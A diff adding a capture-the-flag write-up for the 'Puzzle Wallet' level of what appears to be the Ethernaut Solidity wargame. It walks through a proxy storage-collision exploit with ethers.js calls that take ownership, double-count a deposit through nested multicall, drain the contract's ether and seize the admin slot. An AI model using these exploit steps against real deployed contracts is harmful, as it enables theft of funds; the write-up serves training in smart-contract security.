@@ -631,6 +631,45 @@ This means that we can swap any token. So, we can create a random token. Send it
 
 ## 24 - Puzzle Wallet
 
+The goal of this challenge is to become the `admin` of the contract. We will exploit the proxy storage by modifying variables in the implementation contract, and viceversa.
+
+First we need to become the `owner`. To do that we can propose a new `pendingAdmin`, which will modify the corresponding storage of the `owner`:
+
+```typescript
+tx = await proxyContract.proposeNewAdmin(attacker.address);
+```
+
+Then we add ourselves to the whitelist, in order to execute whitelisted methods:
+
+```typescript
+tx = await puzzleWallet.addToWhitelist(attacker.address);
+```
+
+Then manipulate the balance, to make it double:
+
+```typescript
+const data1 = puzzleWallet.interface.encodeFunctionData("deposit");
+const data2 = puzzleWallet.interface.encodeFunctionData("multicall", [[data1]]);
+
+tx = await await puzzleWallet.multicall([data1, data2], {
+  value: ethers.utils.parseEther("0.001"),
+});
+```
+
+Drain all the ether:
+
+```typescript
+tx = await puzzleWallet.execute(attacker.address, ethers.utils.parseEther("0.002"), "0x");
+```
+
+And finally we can become the `admin` by modifying the `maxBalance` which is in the same storage slot:
+
+```typescript
+tx = await puzzleWallet.setMaxBalance(attacker.address);
+```
+
+[Script](./scripts/24-PuzzleWallet.ts) | [Test](./test/24-PuzzleWallet.spec.ts)
+
 ## 25 - Motorbike
 
 The goal of this one is to autodestruct the `Engine` implementation.
